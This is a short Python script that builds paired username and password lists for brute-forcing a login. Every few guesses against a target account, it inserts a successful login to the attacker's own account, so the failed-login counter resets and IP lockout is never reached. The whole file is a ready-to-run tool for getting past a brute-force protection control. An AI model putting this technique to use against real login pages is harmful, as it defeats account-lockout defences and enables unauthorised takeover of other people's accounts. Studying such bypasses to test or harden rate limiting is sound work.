
# Analyze the bruteforce protection logic and know when the ip is blocked 
# set value of alternateEvery to the max number of failed logins before blocking 
alternateEvery = 3

# Your legitimate account username which will be used to reset the protection counter
legitUsername = ""
password = ""

# Target account and filename of the password list
targetUsername = ""
# existing password list for bruteforcing, this list will be alternated with the legitmate account password  
passwordlist = ""

# Output files
outputUsernameList = ""
outputPasswordList = ""

lst = open(passwordlist)
oul= open(outputUsernameList,"w")
opl= open(outputPasswordList,"w")

LoadedPasswords = [LoadedPasswords.rstrip() for LoadedPasswords in lst]
PasswordsCount = len(LoadedPasswords)
quotient = PasswordsCount // alternateEvery
lineNum= PasswordsCount + quotient

alternateFlag = 0 
passCounter=0
for line in range(lineNum):
    alternateFlag = alternateFlag + 1
    if (alternateFlag == alternateEvery ):
        oul.write(legitUsername+"\n")
        opl.write(password+"\n")
        alternateFlag = 0 
    else:
        oul.write(targetUsername+"\n")
        opl.write(LoadedPasswords[passCounter]+"\n")
        passCounter = passCounter + 1

lst.close()
opl.close()
oul.close()